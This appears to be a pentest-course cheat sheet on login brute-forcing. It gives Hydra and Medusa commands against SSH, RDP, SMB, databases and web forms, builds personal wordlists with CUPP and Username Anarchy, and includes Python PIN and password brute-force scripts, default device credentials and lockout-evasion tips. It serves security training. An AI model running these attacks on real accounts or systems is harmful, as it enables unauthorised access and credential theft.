---
title: "Login Brute Forcing"
description: "Hydra, Medusa, wordlists, and HTTP form attacks."
sidebar:
  order: 2
  label: "Login Brute Forcing"
---
> Brute-forcing network services and web forms with Hydra and Medusa. Creating custom wordlists with CUPP and Username Anarchy.

---


## Reference Wordlists

```bash
# Usernames
/opt/useful/seclists/Usernames/top-usernames-shortlist.txt
/opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt

# Passwords
/opt/useful/seclists/Passwords/Common-Credentials/rockyou.txt
/opt/useful/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
/opt/useful/seclists/Passwords/Common-Credentials/darkweb2017_top-10000.txt
/opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt
```

---

## Hydra — Base Syntax

```bash
hydra [login_options] [password_options] [attack_options] target service
```

| Flag | Description |
|------|-------------|
| `-l user` | Single user |
| `-L users.txt` | User list |
| `-p pass` | Single password |
| `-P pass.txt` | Password list |
| `-t 4` | Parallel threads (default: 16) |
| `-f` | Stop at first success |
| `-s PORT` | Non-standard port |
| `-v / -V` | Verbose / very verbose |
| `-M targets.txt` | Multiple hosts |
| `-x 6:8:aA1` | Generate 6-8 character passwords using charset |

---

## Hydra — Network Services

```bash
# HTTP Basic Auth
hydra -L users.txt -P passes.txt target http-get /
hydra -l user -P passes.txt target http-get / -s 8080

# SSH
hydra -l root -P /opt/useful/seclists/Passwords/Common-Credentials/rockyou.txt ssh://target
hydra -L users.txt -P passes.txt ssh://target -t 4

# FTP
hydra -l admin -P passes.txt ftp://target
hydra -L users.txt -P passes.txt -s 2121 target ftp

# RDP
hydra -l administrator -P passes.txt rdp://target
# With generated charset (no dict):
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 target rdp

# SMB
hydra -L users.txt -P passes.txt smb://target

# MySQL
hydra -l root -P passes.txt mysql://target

# MSSQL
hydra -l sa -P passes.txt mssql://target

# VNC (no username)
hydra -P passes.txt vnc://target

# SMTP
hydra -l admin -P passes.txt smtp://mail.target.com

# Multiple targets
hydra -l root -p toor -M targets.txt ssh
```

---

## Hydra — HTTP Web Forms

### Basic Auth (GET)

```bash
hydra -l admin -P passes.txt target http-get / -s 81
```

### POST Form — Params String Structure

```bash
# Format: "/path:field1=^USER^&field2=^PASS^:F=error_text"
# Or with success: "...:S=302" / "...:S=Dashboard"

hydra -L users.txt -P passes.txt IP -s PORT -f http-post-form \
  "/:username=^USER^&password=^PASS^:F=Invalid credentials"

# With static CSRF token
hydra -L users.txt -P passes.txt target http-post-form \
  "/login:_token=STATIC_TOKEN&username=^USER^&password=^PASS^:F=Invalid"

# Success on 302 redirect
hydra -l admin -P passes.txt target http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=302"
```

### Identifying the Params String

```bash
# 1. Open DevTools (F12) → Network tab
# 2. Submit with incorrect credentials
# 3. View POST request → Form Data → note down field names
# 4. View response → note down error message ("Invalid credentials", etc.)
# Or use Burp Suite to intercept and analyze
```

---

## Medusa — Base Syntax

```bash
medusa -h HOST -u USER -P passes.txt -M MODULE [options]
```

| Flag | Description |
|------|-------------|
| `-h HOST` / `-H FILE` | Single target / target list |
| `-u USER` / `-U FILE` | Single user / user list |
| `-p PASS` / `-P FILE` | Single password / password list |
| `-M MODULE` | Module: ssh, ftp, http, rdp, mysql... |
| `-m "OPT"` | Module options |
| `-t N` | Parallel threads |
| `-f` | Stop on first success (this host) |
| `-F` | Stop on first success (any host) |
| `-n PORT` | Non-standard port |
| `-v LEVEL` | Verbosity level (0-6) |
| `-e ns` | Test empty password (`n`) and user=pass (`s`) |

```bash
# SSH
medusa -h 192.168.1.100 -U users.txt -P passes.txt -M ssh -t 3

# FTP
medusa -h 127.0.0.1 -u ftpuser -P passes.txt -M ftp -t 5

# HTTP Basic Auth — multiple targets
medusa -H web_servers.txt -U users.txt -P passes.txt -M http -m GET

# Empty password or user=pass
medusa -h 10.0.0.5 -U users.txt -e ns -M ssh

# Web form
medusa -M web-form -h target -U users.txt -P passes.txt \
  -m "FORM:username=^USER^&password=^PASS^:F=Invalid"
```

---

## Custom Wordlists

### CUPP — OSINT Profile Wordlist

```bash
# Install
sudo apt install cupp -y

# Interactive mode — generates a customized wordlist
cupp -i
# Answer the prompts: name, nickname, birthday, partner, pet, company, keywords
# Generates: jane.txt with ~46000 personalized passwords

# Other modes
cupp -l    # download lists from a database
cupp -a    # basic interactive mode only
```

### Username Anarchy — Generating Name Variations

```bash
# Install
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# Generate usernames for a given name
./username-anarchy Jane Smith > jane_smith_usernames.txt

# Generates: jane, janesmith, j.smith, smithj, jsmith, js, etc.
```

### Filtering Wordlists by Password Policy

```bash
# Policy: minimum 8 chars + uppercase + lowercase + digit
grep -E '^.{8,}$' wordlist.txt |       # at least 8 chars
grep -E '[A-Z]' |                       # at least one uppercase
grep -E '[a-z]' |                       # at least one lowercase
grep -E '[0-9]' > filtered.txt          # at least one digit

# Add requirement of 2+ special characters
grep -E '([!@#$%^&*].*){2,}' filtered.txt > filtered_special.txt

# Check size
wc -l filtered.txt
```

---

## Python Script — Basic Brute-Forcing

```python
import requests

ip = "TARGET_IP"
port = 1234

# Brute-force 4-digit PIN
for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"PIN: {formatted_pin} | Flag: {response.json()['flag']}")
        break

# Dictionary attack POST
passwords = open("wordlist.txt").read().splitlines()
for password in passwords:
    r = requests.post(f"http://{ip}:{port}/login",
                      data={'username': 'admin', 'password': password})
    if r.ok and 'flag' in r.json():
        print(f"Password: {password}")
        break
```

---

## Brute-Forcing Methods — Comparison

| Method | Description | When to Use |
|--------|-------------|-------------|
| **Simple Brute-Force** | All charset combinations | No password info, unlimited resources |
| **Dictionary Attack** | Predefined wordlist | Target uses common passwords |
| **Hybrid Attack** | Wordlist + mutations (appending, leet) | Password policy with periodic changes |
| **Credential Stuffing** | Leaked credentials from other breaches | Suspicion of password reuse |
| **Password Spraying** | Few passwords against many users | Active account lockout — avoid locks |

---

## Default Credentials — Common Devices

| Device | Username | Password |
|-------------|---------|----------|
| Routers (Linksys, D-Link, TP-Link) | admin | admin |
| Netgear | admin | password |
| Cisco | cisco | cisco |
| Axis IP Camera | root | pass |
| Hikvision DVR | admin | 12345 |
| Ubiquiti UniFi | ubnt | ubnt |

```bash
# Default credentials wordlist
/opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt
```

---

## Pitfalls / Gotchas

- **Account lockout:** password spraying with 1-3 attempts per user, and pauses between rounds. Verify policy first.
- **Hydra `http-post-form` syntax:** use `:` as a separator for the 3 fields (path, params, condition). If the error message contains `:`, it can break the syntax.
- **F= vs S=:** use `F=` (failure string) when the error message is predictable. Use `S=` (success) when the successful response is distinguishable (e.g. 302 redirect, "Dashboard" word).
- **High Hydra -t:** can trigger rate limiting or lockout. Start with `-t 4` in real environments.
- **Dynamic CSRF token:** Hydra cannot handle tokens that change per request. Requires manual scripting or Burp Intruder with macros.
- **Medusa `web-form` module:** less flexible than Hydra's `http-post-form` for complex cases.
- **Unfiltered CUPP:** generates ~46k passwords, many of which do not match the policy. Always filter with grep before using.
- **Username Anarchy:** requires Ruby. If not installed: `sudo apt install ruby`.
- **Compressed rockyou.txt:** on some distros it is located at `/usr/share/wordlists/rockyou.txt.gz`. Decompress it: `gunzip rockyou.txt.gz`.
- **Hydra SSH with key-based auth:** if the server has PasswordAuthentication=no, Hydra cannot attack via password. Verify with `ssh -v`.
- **Hydra `-x` charset:** for pure brute-forcing. Order: `min_len:max_len:charset`. `a`=lowercase, `A`=uppercase, `1`=digits.

---

## Related Cheatsheets

- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting forms to identify parameters
- [Attacking Web Applications with Ffuf](/en/metodologias/recon/attacking-web-applications-ffuf/) — fuzzing directories before attacking the login
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — hashcat, john, Kerberoasting, and cracking hashes
- [Attacking Common Services](/en/metodologias/servicios/attacking-common-services/) — SSH, FTP, RDP, SMB brute-forcing in depth
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — password spraying in AD with kerbrute
